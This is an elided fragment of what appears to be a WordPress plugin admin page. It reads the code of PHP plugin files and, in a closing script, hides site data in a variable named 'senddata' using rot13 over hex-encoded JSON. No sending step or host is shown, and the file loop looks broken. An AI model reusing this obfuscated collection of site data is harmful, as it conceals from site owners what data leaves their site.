...
<div class="tab-pane" id="ContentE">
    ...
    <div class="col-lg-12">
                ...
                foreach($files as $file)
                {
                    ...
                    if(isset($path_parts['extension'])){
                        if(is_file($folder."/".$file) && $path_parts['extension']=="php"){
                            ...
                            $plugintxt = $wp_filesystem->get_contents($folder."/".$file);
                            ...
                            if($plugintxt){
                                ...
                                $readcount = 0;
                                foreach($plugintxt as $plugintxtline)  {
                                    $result = $plugintxtline;
        ...
        <script>
            var senddata = '<?php echo esc_attr(str_rot13(bin2hex(json_encode($sitevdata)))) ;?>';
